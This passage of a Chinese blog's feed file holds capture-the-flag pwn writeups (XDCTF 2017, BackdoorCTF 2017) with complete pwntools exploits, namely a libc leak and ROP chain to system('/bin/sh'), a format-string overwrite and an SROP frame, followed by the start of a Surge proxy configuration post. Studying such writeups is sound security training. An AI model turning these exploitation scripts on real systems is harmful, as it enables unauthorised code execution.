a:</span><br><span class="line">        <span class="keyword">print</span> b</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后的结果是<code>b4ckd00r_us3r:12171337</code></p><p>flag是：KLCTF{b4ckd00r_us3r:12171337}</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> Kaspersky Industrial CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 XDCTF Writeup</title>
      <link href="2017-XDCTF-Pwn-Writeup.html"/>
      <url>2017-XDCTF-Pwn-Writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="easyeasy"><a href="#easyeasy" class="headerlink" title="easyeasy"></a>easyeasy</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/home/swing/Desktop/CTF-Pwn/xdctf/easyeasy/easyeasy&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-01" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-01"></a></p><p>这个地方可以做info leak<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-eayeasy-02" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-eayeasy-02"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-03.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-04.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-05.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-07.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-07.jpg"></a></p><p>当我们触发 目标死亡当那个函数的时候，它会在当前结构体地址+id的地址写入luckynum的最后一位byte<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-08.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-08.jpg"></a><br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-09.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-09.jpg"></a><br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-10.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-10.jpg"></a><br>我们可以通过控制最后一个字节，跳转到0x400aaf,<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-12.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xdctf-easyeasy-12.jpg"></a><br>紧接着我们就可以做一次栈溢出了。。。</p><p><a href="./_image/2017-10-09-20-54-03.jpg" class="gallery-item"><img src="./_image/2017-10-09-20-54-03.jpg"></a></p><p>构造rop </p><h3 id="exploit-编写"><a href="#exploit-编写" class="headerlink" title="exploit 编写"></a>exploit 编写</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    debug = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug :</span><br><span class="line">    io = process(<span class="string">&quot;./easyeasy&quot;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&quot;./easyeasy&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">    system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_offset = next(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip,por)</span><br><span class="line">    context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">len_weapon,weapon_name</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;exit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">    io.sendline(str(len_weapon))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">    io.sendline(str(weapon_name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shot</span>(<span class="params">target</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;exit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;C++\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;id:\n&quot;</span>)</span><br><span class="line">    io.sendline(str(target))</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;break *0x400AA0&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Your name :&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;A&#x27;</span>*<span class="number">7</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) <span class="number">-0x3c3750</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;libc_base: %s&quot;</span> % hex(libc_base))</span><br><span class="line">pause()</span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">shot(<span class="number">0x20</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;exit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;C++&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&quot;loop 3 over&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;luckynum:\n&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(str(<span class="number">0xafafafaf</span>))</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x4010b3</span>) <span class="comment">#pop rdi ret</span></span><br><span class="line">payload += p64(libc_base + binsh_offset)</span><br><span class="line">payload += p64(libc_base + system_offset)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> XDCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BackdoorCTF 2017 Pwn Writeup</title>
      <link href="2017-backdoor-CTF-Pwn.html"/>
      <url>2017-backdoor-CTF-Pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="BABY-0x41414141"><a href="#BABY-0x41414141" class="headerlink" title="BABY-0x41414141"></a>BABY-0x41414141</h2><p>eaysy fmt vul</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;163.172.176.29&#x27;, 9035)</span></span><br><span class="line">io = process(<span class="string">&#x27;./32_new&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print io.recvline()</span></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&#x27;Hello baby pwner, whats your name?\n&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">72</span>/<span class="number">4</span>+<span class="number">60</span>, &#123;<span class="number">0x804a034</span>:<span class="number">0x0804870b</span>&#125;,numbwritten=<span class="number">72</span>,write_size = <span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&#x27;pause&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;aa&#x27;</span>+payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvall(timeout = <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h2 id="JUST-DO-IT"><a href="#JUST-DO-IT" class="headerlink" title="JUST-DO-IT"></a>JUST-DO-IT</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/home/swing/Desktop/CTF-Pwn/backdoor/justdoit/32_chal.dms&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>IDA：<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoodr-just-do-it-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoodr-just-do-it-01.jpg"></a><br>栈溢出：</p><p>尝试覆盖eip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;A&quot;</span>*<span class="number">0x64</span>+<span class="string">&quot;BBBB&quot;</span>+<span class="string">&quot;CCCC&quot;</span>+<span class="string">&quot;DDDD&quot;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoor-ctf-just-do-it-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoor-ctf-just-do-it-02.jpg"></a><br>所以当我们当输入为 112 + 4的时候能覆盖eip，我们就能控制程序跳转</p><h3 id="exploit-编写"><a href="#exploit-编写" class="headerlink" title="exploit 编写"></a>exploit 编写</h3><p>因为题目开启了NX，所以思路是构造leak，去泄漏计算libc地址，然后计算system 地址，构造rop</p><h4 id="ropchain"><a href="#ropchain" class="headerlink" title="ropchain"></a>ropchain</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ropchain = <span class="string">&quot;A&quot;</span>*<span class="number">112</span></span><br><span class="line">ropchain += p32(write_plt)</span><br><span class="line">ropchain += p32(main_addr)</span><br><span class="line">ropchain += p32(<span class="number">1</span>)</span><br><span class="line">ropchain += p32(read_got)</span><br><span class="line">ropchain += p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>但是 最后我发现我得到远程一直断，然后发现他给的libc有问题</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoor-ctf-just-do-it-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoor-ctf-just-do-it-03.jpg"></a></p><p>第二次栈溢出的时候重新计算 距离eip的距离</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*104</span><br><span class="line">payload += p32(system_addr)</span><br></pre></td></tr></table></figure><p>将会覆盖eip为system地址<br>所以第二段payload构造为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">104</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">payload += p32(binsh_addr)</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip = <span class="string">&quot;163.172.176.29&quot;</span></span><br><span class="line">port = <span class="number">9036</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./32_chal.dms&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr =  <span class="number">0x804847d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt;<span class="number">1</span>:</span><br><span class="line">    debug = <span class="literal">True</span></span><br><span class="line">    local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    debug = <span class="literal">False</span></span><br><span class="line">    local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    read_offset = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_offset = next(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">    read_offset = <span class="number">0xd4350</span></span><br><span class="line">    system_offset = <span class="number">0x3a940</span></span><br><span class="line">    binsh_offset = <span class="number">0x15900b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#io = process(&quot;./32_chal.dms&quot;,env = &#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">    io = process(<span class="string">&quot;./32_chal.dms&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ropchain = <span class="string">&quot;A&quot;</span>*<span class="number">112</span></span><br><span class="line">ropchain += p32(write_plt)</span><br><span class="line">ropchain += p32(main_addr)</span><br><span class="line">ropchain += p32(<span class="number">1</span>)</span><br><span class="line">ropchain += p32(read_got)</span><br><span class="line">ropchain += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.sendline(ropchain)</span><br><span class="line"></span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;read_addr: 0x%x&quot;</span> % read_addr)</span><br><span class="line">libc_base = read_addr - read_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment">#log.info(&quot;system_offset:0x%x&quot; % libc.symbols[&quot;system&quot;])</span></span><br><span class="line"><span class="comment">#log.info(&quot;binsh_offset: 0x%x&quot; % next(libc.search(&quot;/bin/sh\x00&quot;)))</span></span><br><span class="line">log.info(<span class="string">&quot;system_addr: 0x%x&quot;</span> % system_addr)</span><br><span class="line">log.info(<span class="string">&quot;binsh_addr: 0x%x&quot;</span> % binsh_addr)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;break *0x80484b9&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">104</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">io.recv()</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#io.recv()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="FUNSIGNALS"><a href="#FUNSIGNALS" class="headerlink" title="FUNSIGNALS"></a>FUNSIGNALS</h2><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-backdoor-ctf-funsignals-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-backdoor-ctf-funsignals-01.jpg"></a>syscall 先是调用read </p><p>但是没有ret 很干阿。。。</p><p>但是发现他调用了 sys_rt_sigreturn 卧槽 这不是srop吗…<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-backdoor-ctf-funsignals-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-backdoor-ctf-funsignals-02.jpg"></a><br>发现其实flag是写在bin程序里的</p><p>所以只要构造rop，调用writeup，将这个flag读出来就可以了。。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_write</span><br><span class="line">frame.rdi = constants.STDOUT_FILENO</span><br><span class="line">frame.rsi = <span class="number">0x10000023</span> <span class="comment">#flag string address</span></span><br><span class="line">frame.rdx = <span class="number">50</span> <span class="comment">#read size</span></span><br><span class="line">frame.rsp = <span class="number">0xABADCAFE</span></span><br><span class="line">frame.rip = <span class="number">0x10000015</span> <span class="comment">#syscall gadget</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./player_bin.dms&quot;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#io = remote(&quot;163.172.176.29&quot;, 9034)</span></span><br><span class="line">io.send(str(frame))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> BackdoorCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac-Surge-2 部分配置</title>
      <link href="Mac-Surge-2.html"/>
      <url>Mac-Surge-2.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="ss代理设置"><a href="#ss代理设置" class="headerlink" title="ss代理设置"></a>ss代理设置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Proxy]</span><br><span class="line">🇭🇰 HK = custom,abclite.cn,10000,rc4-md5,abclite.cn,https://github.com/stoneChen/Surge-config/raw/master/SSEncrypt.module</span><br><span class="line">🇸🇬 SG = custom,abclite.cn,10000,rc4-md5,abclite.cn,https://github.com/stoneChen/Surge-config/raw/master/SSEncrypt.module</span><br><span class="line">🇯🇵 JP = custom,abclite.cn,10000,rc4-md5,abclite.cn,https://github.com/stoneChen/Surge-config/raw/master/SSEncrypt.module</span><br><span class="line">🇺🇸 US = custom,abclite.cn,10000,rc4-md5,abclite.cn,https://github.com/stoneChen/Surge-config/raw/master/SSEncrypt.module</span><br><span class="line">🇰🇷 KR = custom,abclite.cn,10000,rc4-md5,abclite.cn,https://github.com/stoneChen/Surge-config/raw/master/SSEncrypt.module</span><br></pre></td></tr></table></figure><p>[Proxy]是具体的代理配置，它下面就是5个ss服务器节点, 这里只是5个国家例子，根据你拥有的ss账号数来决定，拥有几个账号就留下其中几个对应国旗配置就好。表面上看就是5个键值对(键可以自定义)，键中加上国旗可以很直观的区分不同国家的ss节点，值中的变量分别表示：</p><ul><li>ss-server host: ss主机，ip或域名</li><li>ss-server port: ss主机端口</li><li>ss encrypt type: 加密方式</li><li>ss-password: ss密码<br>custom不能改，是一个约定类型(ss协议)，最末一项是ss模块下载地址，也不需要改,当选择了当前配置所在的配置文件，Surge会去下载ss模块，有弹窗提示。<br>[Proxy Group]是一个组策略配置，它的某一项配置可以引用[Proxy]中的配置，也可以引用其他的组策略配置。这里有select, url-test, ssid三种策略可以用，具体请阅读example-chinese.conf中的注释。<br>简单讲：</li><li>select：在菜单上手动选择ss节点</li><li>url-test：定时轮询向指定的地址发起请求，哪个节点响应时间最短，则切换到哪个ss节点</li><li>ssid： 根据wifi名字进行切换ss节点</li></ul><p>更多详尽的配置可以看<a href="https://github.com/WinMin/Surge/blob/master/surge.conf">github</a></p><h2 id="终端代理"><a href="#终端代理" class="headerlink" title="终端代理"></a>终端代理</h2><p>mac下我用的是oh-my-zsh<br><code>vim vim ~/.zshrc </code><br>在底下加上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 